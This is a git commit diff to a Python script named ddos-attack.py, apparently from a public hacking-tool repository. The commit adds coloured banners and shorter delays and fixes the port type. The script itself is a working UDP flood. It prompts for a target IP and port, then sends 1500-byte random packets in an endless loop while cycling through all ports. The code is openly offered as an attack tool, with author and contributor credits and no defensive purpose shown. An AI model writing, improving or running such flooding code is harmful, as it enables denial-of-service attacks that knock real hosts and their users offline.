0999b7a9e0461724906155b2d5530ac056dc04d5
Mk <67423720+muki119@users.noreply.github.com>
2020-06-27 00:39:06 +0100

    visual update

--- ddos-attack.py
+++ ddos-attack.py
@@ -4,6 +4,17 @@ import time
 import socket
 import random
 
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+ 
 #Code Time
 from datetime import datetime
 now = datetime.now()
@@ -15,39 +26,47 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+bytes_v = os.urandom(1500)
 #############
 
 os.system("clear")
 os.system("figlet DDos Attack")
-print
-print ("Author   : HA-MRX")
-print ("You Tube : https://www.youtube.com/c/HA-MRX")
-print ("github   : https://github.com/Ha3MrX")
+
+with open("as.txt","r") as aas:
+  for lines in aas:
+    print (lines.rstrip())
+
+print ()
+print (bcolors.OKGREEN,"Author   : HA-MRX",bcolors.ENDC)
+print ("YouTube : https://www.youtube.com/c/HA-MRX")
+print ("Github   : https://github.com/Ha3MrX")
 print ("Facebook : https://www.facebook.com/muhamad.jabar222")
-print()
+print (bcolors.OKGREEN,"Contributors : Muki119",bcolors.ENDC)
+print ("Github : https://github.com/muki119")
+print ()
+
 ip = input("IP Target : ")
-port = input("Port       : ")
+port = int(input("Port       : "))
 
 os.system("clear")
 os.system("figlet Attack Starting")
 print ("[                    ] 0% ")
-time.sleep(5)
+time.sleep(0.5)
 print ("[=====               ] 25%")
-time.sleep(5)
+time.sleep(0.55)
 print ("[==========          ] 50%")
-time.sleep(5)
+time.sleep(0.6)
 print ("[===============     ] 75%")
-time.sleep(5)
+time.sleep(0.65)
 print ("[====================] 100%")
-time.sleep(3)
+time.sleep(0.7)
 sent = 0
-
 while True:
-     sock.sendto(bytes, (ip,port))
+     sock.sendto(bytes_v, (ip,port))
      sent = sent + 1
      port = port + 1
      print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
      if port == 65534:
        port = 1
+
 
